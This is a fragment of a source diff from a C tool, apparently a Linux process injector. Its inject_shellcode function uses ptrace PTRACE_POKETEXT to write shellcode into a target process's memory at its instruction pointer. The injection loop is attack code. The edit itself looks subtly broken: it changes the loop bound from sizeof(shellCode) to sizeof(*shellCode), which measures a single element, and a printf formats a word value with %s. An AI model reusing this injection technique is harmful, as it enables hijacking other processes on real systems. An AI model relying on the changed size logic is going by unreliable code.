@@ -49,9 +49,9 @@ int inject_shellcode(pid_t targetProcessId, struct user_regs_struct targetProces
 
     printf("[+] target Process Insturction pointer %p\n", targetProcessInstructionPointer);
 
-    printf("Shell code's size: %zu\n", sizeof(shellCode));
+    printf("Shell code's size: %zu\n", sizeof(*shellCode));
 
-    for (int i = 0; i < sizeof(shellCode); i+=4, *shellCodeStartAddress++, *memoryAddressToChange++){
+    for (int i = 0; i < sizeof(*shellCode); i+=4, *shellCodeStartAddress++, *memoryAddressToChange++){
             printf("[+] Running the ptrace syscall with the parameters: %d,\n %p,\n %s\n", targetProcessId, memoryAddressToChange, *shellCodeStartAddress);
             int syscallReturnCode = ptrace(PTRACE_POKETEXT, targetProcessId, memoryAddressToChange, *shellCodeStartAddress);
             if (syscallReturnCode < 0){
